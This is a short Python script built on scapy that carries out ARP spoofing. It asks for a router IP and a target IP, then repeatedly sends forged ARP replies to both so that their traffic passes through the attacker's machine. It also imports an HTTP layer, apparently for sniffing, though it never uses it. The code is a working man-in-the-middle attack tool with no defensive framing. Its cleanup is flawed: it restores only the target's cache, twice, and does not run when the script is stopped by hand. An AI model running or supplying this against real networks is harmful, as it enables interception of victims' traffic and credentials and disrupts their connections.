import scapy.all as scapy
import time
from scapy.layers import http
def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet  = broadcast/arp_req
    answered = scapy.srp(packet,timeout=1,verbose=False)[0]
    mac = answered[0][1].hwsrc
    return mac

def spoof(target_ip , spoof_ip):
    spoof_packet = scapy.ARP (op=2 ,pdst=target_ip,hwdst=get_mac(target_ip),psrc=spoof_ip)
    scapy.send(spoof_packet,verbose=False)
def restore(target_ip , spoof_ip):
    spoof_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip , hwsrc=get_mac(spoof_ip))
    scapy.send(spoof_packet , count=5 , verbose=False)



def start():
    i = 0
    router_ip = input("\n\nENTER THE ROUTER IP : ")
    target_ip = input("\nENTER THE TARGET IP : ")
    while True:
        try:
            spoof(target_ip,router_ip)
            spoof(router_ip,target_ip)
            i += 2
            print(f"\r [+]{i} packet send",end="")
            time.sleep(2)
        except Exception as e:
            print(e)
            restore(target_ip,router_ip)
            restore(target_ip,router_ip)
            print("restored ARP tables of victims.....")
            exit(0)

